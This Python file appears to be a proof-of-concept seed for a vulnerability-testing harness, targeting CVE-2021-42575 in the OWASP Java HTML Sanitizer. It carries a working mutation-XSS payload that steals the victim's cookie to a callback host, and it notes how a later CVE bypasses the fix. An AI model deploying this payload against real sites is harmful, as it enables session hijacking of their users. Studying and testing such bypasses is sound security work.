#!/usr/bin/env python3
"""[GIVEN] CVE-2021-42575 seed -- the STYLE-element text policy-enforcement bypass in the OWASP Java
HTML Sanitizer, exercised through the CVE-2021-42575 fix's own banned-marker filter.

Root sink: `HtmlStreamRenderer` emission of `<style>` CDATA text. Before CVE-2021-42575 the style
text was appended UNGUARDED, so a policy that allows `style` with `allowTextIn("style")` let an
attacker smuggle raw HTML markup as "style text" that a browser re-parses as live nodes. The
CVE-2021-42575 fix (commit be33ec6 "Render style tag content more strictly", released 20211018.1)
hardened this by (a) wrapping style text in `/*<![CDATA[<!--*/ ... /*-->]]>*/` and (b) DROPPING the
whole style text when it contains any of the CDATA/comment markers `<![CDATA[`, `]]>`, `<!--`, `-->`
(BANNED_IN_STYLE_ELEMENTS) -- the exact marker set the CVE-2021-42575 mXSS abused.

This seed is a faithful representative of that marker class: the style text carries the `]]>` marker
plus a smuggled `</noscript><script>` (delivered inside `<noscript>` so a scripting-enabled browser
will re-parse it -- the canonical select>option>style vector no longer executes in modern Chromium's
restricted select parsing, and the sanitizer strips `<svg>`, so `<noscript>` is the executable
carrier). On V0 (20200713.1, pre-fix) HtmlStreamRenderer emits the style text UNGUARDED:
    <noscript><style>]]></noscript><script>...</script></style></noscript>
A scripting-ENABLED browser parses `<noscript>` content as RAWTEXT until the first literal
`</noscript>` (the smuggled one), closes noscript, then parses the trailing `<script>...</script>` as
LIVE -> executes -> reads document.cookie -> exfiltrates the flag. Real execution (verified in
Chromium 149).

On V1 (20211018.1, the CVE-2021-42575 fix = TARGET) the be33ec6 banned-marker filter sees `]]>` in
the style text and EMPTIES it, so the server emits `<noscript><style></style></noscript>` -- no
smuggled `</noscript>`/`<script>` survives -> BLOCKED (no flag), verified server-side and in-browser.

The gap CVE-2025-66021 later bypasses: drop the `]]>` marker, same noscript/style desync.
"""
import json
import sys

# Internal compose callback the exfil payload navigates to (not a host port).
CB = "//callback:9000/c?f="

# Benign-canary CVE-2021-42575 marker-class seed: `]]>` (a BANNED_IN_STYLE_ELEMENTS marker) plus a
# smuggled `</noscript><script>` that reads the victim's OWN cookie -> internal callback. The `]]>`
# is exactly what the 20211018.1 be33ec6 filter drops; the smuggled tail is what makes it execute on
# the pre-fix V0.
ORIGINAL_PAYLOAD = (
    "<noscript><style>]]></noscript><script>"
    "document.location='" + CB + "'+document.cookie"
    "</script>"
)


def candidate() -> dict:
    """JSON candidate for seed_exec: CVE-2021-42575 STYLE-marker seed."""
    return {
        "probe_id": "cve-2021-42575-style-marker",
        "payload": ORIGINAL_PAYLOAD,
        "mode": "load",
    }


if __name__ == "__main__":
    _ = sys.argv  # original_poc.py [version] — version is unused; seed_exec gets it separately
    print(json.dumps(candidate()))
